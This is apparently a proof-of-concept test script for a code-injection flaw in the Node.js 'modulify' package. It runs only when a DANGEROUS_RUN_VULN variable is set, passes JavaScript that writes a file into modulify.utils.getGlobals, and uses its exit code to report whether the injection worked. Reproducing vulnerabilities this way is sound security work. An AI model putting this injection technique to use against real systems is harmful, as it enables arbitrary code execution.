if (!process.env.DANGEROUS_RUN_VULN) {
	console.log(
		"NOT RUNNING VULNERABLE CODE WITHOUT 'DANGEROUS_RUN_VULN' ENVIRONMENT VARIABLE",
	);
	process.exit(1);
}

const fs = require("fs");
const modulify = require("modulify");
const path = "./modulify";
file_exist = fs.existsSync(path);
console.log("a", file_exist);
try {
	modulify.utils.getGlobals("require(`fs`).writeFileSync(`modulify`,``)");
} catch (error) {}
file_exist = fs.existsSync(path);
fs.unlink(path, function (err) {});
console.log("b", file_exist);

if (file_exist) {
	process.exit(0);
} else {
	process.exit(82);
}
